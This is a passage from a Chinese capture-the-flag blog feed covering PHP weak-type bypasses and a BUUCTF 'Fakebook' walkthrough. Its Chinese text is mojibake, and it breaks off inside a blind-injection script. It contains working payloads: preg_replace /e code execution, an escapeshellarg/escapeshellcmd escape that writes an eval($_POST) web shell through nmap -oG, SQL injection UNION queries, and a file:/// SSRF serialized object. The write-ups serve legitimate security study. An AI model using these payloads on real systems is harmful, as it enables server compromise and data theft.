class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params">$re, $str</span>) </span>&#123;    <span class="hljs-keyword">return</span> preg_replace(        <span class="hljs-string">&#x27;/(&#x27;</span> . $re . <span class="hljs-string">&#x27;)/ei&#x27;</span>,        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,        $str    );&#125;<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;    <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">&quot;\n&quot;</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;@<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&#125;</code></pre><blockquote><p>/eæ¨¡å¼çš„preg_replace,æœ‰ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚åˆ©ç”¨è¿™ä¸ªä»£ç æ‰§è¡Œï¼Œæ‰§è¡Œæºç ä¸­çš„getFlag()å‡½æ•°ï¼Œåœ¨ä¼ å…¥cmdå‚æ•°ï¼Œå†åˆ©ç”¨getFlagä¸­çš„evalï¼ˆï¼‰å‡½æ•°ï¼Œå†è¿›è¡Œä¸€ä¸ªä»£ç æ‰§è¡Œã€‚</p></blockquote><blockquote><p>åå‘å¼•ç”¨</p><blockquote><p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·å°†å¯¼è‡´ç›¸å…³åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œ\1æŒ‡çš„æ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹</p></blockquote></blockquote><p>å®˜æ–¹payload<code>/?.*=&#123;$&#123;phpinfo()&#125;&#125;</code>å³</p><pre><code class="hljs dart">preg_replace(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="hljs-string">&#x27;&#123;<span class="hljs-subst">$&#123;phpinfo()&#125;</span>&#125;&#x27;</span>);</code></pre><p>GETæ–¹å¼ä¼ çš„å­—ç¬¦ä¸²ï¼Œ.ä¼šè¢«æ›¿æ¢æˆ_ï¼Œè¿™é‡Œé‡‡ç”¨</p><p><code>\S*=$&#123;phpinfo()&#125;  #\S </code>åœ¨phpæ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºåŒ¹é…æ‰€æœ‰éç©ºå­—ç¬¦ï¼Œ*è¡¨ç¤ºå¤šæ¬¡åŒ¹é…</p><p>payload:</p><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</code></pre><h2 id="ç»•è¿‡escapeshellarg-escapeshellcmdå‡½æ•°"><a class="header-anchor" href="#ç»•è¿‡escapeshellarg-escapeshellcmdå‡½æ•°">ğŸ­</a>ç»•è¿‡escapeshellarg+escapeshellcmdå‡½æ•°</h2><blockquote><p>escapeshellarg</p><blockquote><p>ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚</p></blockquote></blockquote><blockquote><p>escapeshellcmd</p><blockquote><p>å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|?~&lt;&gt;^()[]{}$, \x0A å’Œ \xFFã€‚ *â€™ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹æ—¶è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p></blockquote></blockquote><p>åœ¨è§£æå•å¼•å·çš„æ—¶å€™ , è¢«å•å¼•å·åŒ…è£¹çš„å†…å®¹ä¸­å¦‚æœæœ‰å˜é‡ , è¿™ä¸ªå˜é‡åæ˜¯ä¸ä¼šè¢«è§£ææˆå€¼çš„ï¼Œä½†æ˜¯åŒå¼•å·ä¸åŒ , bash ä¼šå°†å˜é‡åè§£ææˆå˜é‡çš„å€¼å†ä½¿ç”¨ã€‚ä½†å³ä½¿å‚æ•°ç”¨äº† <strong>escapeshellarg</strong> å‡½æ•°è¿‡æ»¤å•å¼•å·ï¼Œä½†å‚æ•°åœ¨æ‹¼æ¥å‘½ä»¤çš„æ—¶å€™å¦‚æœç”¨äº†åŒå¼•å·çš„è¯è¿˜æ˜¯ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚</p><p>escapeshellcmdåŒæ ·æ˜¯å¯¹å•å¼•å·è¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯æœ‰åŒºåˆ«</p><p><img src="/2021/04/17/lowtype/2.png" alt="2"></p><p>å¯¹äºå•ä¸ªå•å¼•å·, <strong>escapeshellarg</strong> å‡½æ•°è½¬ä¹‰å,è¿˜ä¼šåœ¨å·¦å³å„åŠ ä¸€ä¸ªå•å¼•å·,ä½† <strong>escapeshellcmd</strong> å‡½æ•°æ˜¯ç›´æ¥åŠ ä¸€ä¸ªè½¬ä¹‰ç¬¦ï¼Œå¯¹äºæˆå¯¹çš„å•å¼•å·, <strong>escapeshellcmd</strong> å‡½æ•°é»˜è®¤ä¸è½¬ä¹‰,ä½† <strong>escapeshellarg</strong> å‡½æ•°è½¬ä¹‰ã€‚</p><p>æµ‹è¯•ï¼š</p><img src="/2021/04/17/lowtype/3.jpg" alt="3" style="zoom: 50%;"><blockquote><p>ä¸€å¼€å§‹ä¼ å…¥çš„å‚æ•°<br>127.0.0.1â€™ -v -d a=1<br>ç»è¿‡escapeshellargå‡½æ•°å¤„ç†ï¼Œå…ˆè½¬ä¹‰å†ç”¨å•å¼•å·æ‹¬èµ·æ¥<br>â€˜127.0.0.1â€™â€˜â€™ -v -d a=1â€™<br>å†ç»è¿‡escapeshellcmdå‡½æ•°å¤„ç†ï¼Œæ•°ä¸­çš„\ä»¥åŠa=1â€™ä¸­çš„å•å¼•å·è¿›è¡Œå¤„ç†è½¬ä¹‰<br>â€˜127.0.0.1â€™\â€˜â€™ -v -d a=1â€™<br>ç”±äºè¿™ä¸€æ­¥çš„å¤„ç†ï¼Œä½¿å¾—\è¢«è§£é‡Šæˆäº†\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥å•å¼•å·é…å¯¹è¿æ¥ä¹‹åå°†è¯­å¥åˆ†å‰²ä¸ºä¸‰ä¸ªéƒ¨åˆ†</p></blockquote><p>æœ€åsystemå‡½æ•°æ˜¯å¯¹<code>127.0.0.1\</code>å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸º<code>a=1'</code>,å¦‚æœä¸¤ä¸ªå‡½æ•°ç¿»è¿‡æ¥åˆ™ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜</p><h4 id="BUUCTF-2018-Online-Tool"><a class="header-anchor" href="#BUUCTF-2018-Online-Tool">ğŸ­</a>[BUUCTF 2018]Online Tool</h4><img src="/2021/04/17/lowtype/5.png" alt="5" style="zoom: 50%;"><p><strong>nmapå‘½ä»¤ä¸­ å‚æ•°<code>-oG</code>å¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</strong></p><p>escapeshellargå‡½æ•°ä¼šå…ˆå¯¹hostå˜é‡ä¸­çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œå¹¶ä¸”è½¬ä¹‰ä¹‹åï¼Œåœ¨ â€™ çš„å·¦å³ä¸¤è¾¹å†åŠ ä¸Šå•å¼•å·ï¼Œå˜æˆ <code>'\''</code></p><p>ç„¶åescapeshellcmdå‡½æ•°ï¼Œä¼šå¯¹hostå˜é‡ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰</p><pre><code>ï¼ˆ&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A//å’Œ\xFFä»¥åŠä¸é…å¯¹çš„å•/åŒå¼•å·è½¬ä¹‰ï¼‰</code></pre><p>é‚£ä¹ˆä¸Šé¢çš„ \ å°±ä¼šè¢«å†æ¬¡è½¬ä¹‰ï¼Œæ¯”å¦‚å˜æˆ â€˜\â€™',å¦‚æœåœ¨å­—ç¬¦ä¸²é¦–å°¾åŠ ä¸Šå•å¼•å·ï¼Œç»è¿‡escapeshellargå‡½æ•°ä¹‹åï¼Œå°±å¯ä»¥å®ç°å°†å•å¼•å·ç»™é—­åˆäº†ï¼Œåœ¨ç»è¿‡escapeshellcmdå‡½æ•°çš„æ—¶å€™å•å¼•å·å°±æ˜¯é…å¯¹çš„,ä¸ä¼šè¿›è¡Œè½¬ä¹‰</p><pre><code class="hljs groovy"><span class="hljs-string">&#x27; genius &#x27;</span><span class="hljs-attr">escapeshellarg:</span><span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> genius <span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-attr">escapeshellcmd:</span> <span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> genius <span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span></code></pre><p>è¿™æ ·å¯å®ç°å•å¼•å·é€ƒé€¸</p><p><img src="/2021/04/17/lowtype/6.png" alt="6"></p><p>ä½†escapeshellcmdä¼šæŠŠä¸€å¥è¯æœ¨é©¬ä¸­çš„ä¸€äº›å­—ç¬¦ç»™è½¬ä¹‰çš„ï¼Œç»æµ‹è¯•åœ¨æœ¬åœ°æ‰§è¡Œå‘ç°è™½ç„¶çœ‹èµ·æ¥è½¬ä¹‰äº†ï¼Œä½†å†™å…¥çš„è¯è¿˜æ˜¯æ²¡æœ‰è¢«è½¬ä¹‰çš„</p><img src="/2021/04/17/lowtype/7.jpg" alt="7" style="zoom: 67%;"><p>payload:</p><pre><code class="hljs php-template"><span class="xml">&#x27; </span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"> -oG 1.php &#x27;</span><span class="xml">æˆ–</span><span class="xml">&#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"> -oG 1.php &#x27;</span></code></pre><p>å†ç”¨èšå‰‘è¿æ¥å³å¯ï¼Œä¹Ÿå¯ä»¥ç”¨getä¼ å‚ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://e<span class="hljs-number">5</span>b<span class="hljs-number">384</span>ba-<span class="hljs-number">6852</span>-<span class="hljs-number">4</span>e<span class="hljs-number">3</span>f-<span class="hljs-number">9060</span>-c<span class="hljs-number">66</span>dc<span class="hljs-number">267</span>e<span class="hljs-number">554</span>.node<span class="hljs-number">3</span>.buuoj.cn/<span class="hljs-number">8</span>f<span class="hljs-number">9395193</span>b<span class="hljs-number">358</span>d<span class="hljs-number">86</span>a<span class="hljs-number">100</span>d<span class="hljs-number">2</span>fd<span class="hljs-number">1</span>f<span class="hljs-number">0349</span>a<span class="hljs-number">2</span>/<span class="hljs-number">2</span>.php?a=system(&#x27;cat /flag&#x27;);</code></pre><h2 id="md5å¼ºç±»å‹"><a class="header-anchor" href="#md5å¼ºç±»å‹">ğŸ­</a>md5å¼ºç±»å‹</h2><pre><code class="hljs autoit">(<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;a1&#x27;</span>]!==(<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;a2&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a1&#x27;</span>])===md5($_POST[<span class="hljs-string">&#x27;a2&#x27;</span>])&#125;</code></pre><p>æ­¤æ—¶ä½¿ç”¨æ•°ç»„å°±ä¸å¯è¡Œï¼Œå› ä¸ºæœ€åè½¬ä¸ºå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥åªèƒ½æ„é€ ä¸¤ä¸ªMD5å€¼ç›¸åŒçš„ä¸åŒå­—ç¬¦ä¸².</p><pre><code class="hljs llvm">ä¸¤ç»„ç»è¿‡urlç¼–ç åçš„å€¼<span class="hljs-symbol">#1</span>a=b=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1U</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">#2</span>a=b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span></code></pre><h2 id="PHPç²¾åº¦ç»•è¿‡ç¼ºé™·"><a class="header-anchor" href="#PHPç²¾åº¦ç»•è¿‡ç¼ºé™·">ğŸ­</a>PHPç²¾åº¦ç»•è¿‡ç¼ºé™·</h2><p><img src="/2021/04/17/lowtype/9.png" alt="9"></p><p>è¯¦è§ï¼š<a href="http://www.haodaquan.com/12">phpè¸©è¿‡çš„é‚£äº›å‘ï¼ˆ1ï¼‰æµ®ç‚¹æ•°è®¡ç®—</a></p><p>PHP é€šå¸¸ä½¿ç”¨ IEEE 754 åŒç²¾åº¦æ ¼å¼è€Œä¸”ç”±äºæµ®ç‚¹æ•°çš„ç²¾åº¦æœ‰é™çš„åŸå› ã€‚é™¤æ­¤ä¹‹å¤–å–æ•´è€Œå¯¼è‡´çš„æœ€å¤§ç›¸å¯¹è¯¯å·®ä¸º 1.11e-16,å½“å°æ•°å°äº10^-16åï¼ŒPHPå¯¹äºå°æ•°å°±å¤§å°ä¸åˆ†äº†ï¼Œå¦‚ï¼š</p><p><img src="/2021/04/17/lowtype/10.png" alt="10"></p><p>è¿™ä¸ªä¾‹é¢˜æ˜å¤©å†åš</p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2><p>å¼±ç±»å‹çš„ç»•è¿‡æœ‰ä¸€ä¸ªå…±åŒæ–¹å‘â€”â€”å°†è¦æ¯”è¾ƒçš„å€¼ç½®é›¶ï¼Œå¤šæ•°æ˜¯å°†å€¼ä»¤ä¸ºç©ºæˆ–è€…ä»¤ä¸ºæ•°ç»„è¾¾åˆ°ç›¸ç­‰çš„æ•ˆæœã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/Atkx/p/14264132.html#4md5_94">ä»£ç å®¡è®¡ä¹‹å¼±ç±»å‹ç»•è¿‡</a></p><p><a href="https://blog.csdn.net/qq_43431158/article/details/103265404">PHPå¼±ç±»å‹åŠä¸€äº›ç»•è¿‡å§¿åŠ¿</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF[ç½‘é¼æ¯ 2018]Fakebook</title>
    <link href="/2021/04/16/fakebook/"/>
    <url>/2021/04/16/fakebook/</url>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜æ¶‰åŠçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå¤šã€‚</p><p>æŸ¥çœ‹æºç æ‰¾ä¸åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰«ä¸€ä¸‹ç›®å½•</p><p><img src="/2021/04/16/fakebook/1.jpg" alt="1"></p><p>æ‹¿åˆ°robots.txt,è·Ÿè¿›ä¸‹è½½user.php.bak</p><p><img src="/2021/04/16/fakebook/2.png" alt="2"></p><p>SSRFè¯¦è§ï¼š<a href="https://liquor-boop.github.io/2021/02/08/SSRF/">SSRF</a></p><p>éšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·å¹¶æŸ¥çœ‹å‘ç°ç½‘å€æœ‰ç‚¹åƒSQLæ³¨å…¥ï¼Œç”¨sqlmapè·‘ä¸å‡ºæ¥</p><p><img src="/2021/04/16/fakebook/3.jpg" alt="3"></p><p>æ•°æ®å‹ï¼š</p><p><img src="/2021/04/16/fakebook/6.jpg" alt="6"></p><p>æµ‹è¯•åˆ—æ•°ï¼š</p><p><img src="/2021/04/16/fakebook/4.jpg" alt="4"></p><p>åˆ—æ•°ä¸º4,ç»§ç»­æµ‹è¯•<code>?no=1 union select 1,2,3,4--+</code>æ˜¾ç¤ºno hack,åˆ¤æ–­å­˜åœ¨wafï¼Œæµ‹è¯•äº†ä¸€ä¸‹åº”è¯¥æ˜¯ç©ºæ ¼è¿‡æ»¤æ‰äº†</p><p><img src="/2021/04/16/fakebook/7.jpg" alt="7"></p><p>å‡ºç°äº†ååºåˆ—åŒ–å‡½æ•°ï¼Œæœ¬é¢˜è§£æ³•ä¸ååºåˆ—åŒ–ç›¸å…³ã€‚</p><p>çˆ†åº“</p><p><img src="/2021/04/16/fakebook/8.jpg" alt="8"></p><p>çˆ†è¡¨</p><p>payloadï¼š</p><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre><p><img src="/2021/04/16/fakebook/9.jpg" alt="9"></p><p>çˆ†åˆ—</p><p>payload</p><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre><p><img src="/2021/04/16/fakebook/10.jpg" alt="10"></p><p>çˆ†å€¼</p><pre><code class="hljs sql">?no=-1<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">data</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre><p><img src="/2021/04/16/fakebook/11.jpg" alt="11"></p><p>å¯ä»¥å‘ç°åœ¨dataå­—æ®µé‡Œæœ‰æˆ‘ä»¬æœ€å¼€å§‹å¡«çš„ä¿¡æ¯çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªé“¾æ¥ä¹Ÿåºåˆ—åŒ–<code>file:///var/www/html/flag.php</code>ï¼ŒæŠŠflag.phpçš„è¯»å–å‡ºæ¥ã€‚<br>åºåˆ—åŒ–</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;111&quot;</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">111</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = $name;        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;    &#125;&#125;$a = <span class="hljs-keyword">new</span> UserInfo(â€˜<span class="hljs-number">111</span>â€˜,<span class="hljs-number">111</span>,â€˜file:<span class="hljs-comment">///var/www/html/flag.phpâ€˜);</span>$a = serialize($a);<span class="hljs-keyword">echo</span> $a;<span class="hljs-comment">//ç»“æœ:</span>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">111</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</code></pre><p>å› ä¸ºdataæ˜¯ç¬¬å››ä¸ªå­—æ®µï¼Œæ‰€ä»¥åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ‰€ä»¥æ”¾åœ¨4å·ä½ä¸Š<br>payload</p><pre><code class="hljs rust">?no=-<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span></span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;--+</code></pre><p>æŸ¥è¿”å›é¡µé¢çš„æºç ï¼Œå¾—åˆ°ç¼–ç </p><img src="/2021/04/16/fakebook/12.jpg" alt="12" style="zoom:67%;"><p>è¿™é“é¢˜åœ¨ç½‘ä¸Šæœ‰å¦ä¸€ç§éé¢„æœŸè§£ï¼š</p><p>è„šæœ¬è¿è¡Œï¼š</p><pre><code class="hljs livecodeserver">import requestsdef <span class="hljs-built_in">exp</span>(url_format,<span class="hljs-built_in">length</span>=None):    rlt = <span class="hljs-string">&#x27;&#x27;</span>    url  = url_format    <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span>==None:        <span class="hljs-built_in">length</span> = <span class="hljs-number">50</span>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-built_in">length</span>+<span class="hljs-number">1</span>):        begin = <span class="hljs-number">1</span>        <span class="hljs-keyword">ends</span> = <span class="hljs-number">126</span>        tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2</span>        <span class="hljs-keyword">while</span> begin&lt;<span class="hljs-keyword">ends</span>:            r = requests.<span class="hljs-built_in">get</span>(url.<span class="hljs-built_in">format</span>(l,tmp))            <span class="hljs-comment">#åˆ¤æ–­æ¡ä»¶æ ¹æ®æƒ…å†µä¿®æ”¹</span>            <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span> <span class="hljs-keyword">in</span> r.content:                begin = tmp+<span class="hljs-number">1</span>                tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2 </span>            <span class="hljs-keyword">else</span>:                <span class="hljs-keyword">ends</span> = tmp                tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2</span>        rlt+=chr(tmp)        print(rlt)    <span class="hljs-literal">return</span> rlt.rstrip()url = <span 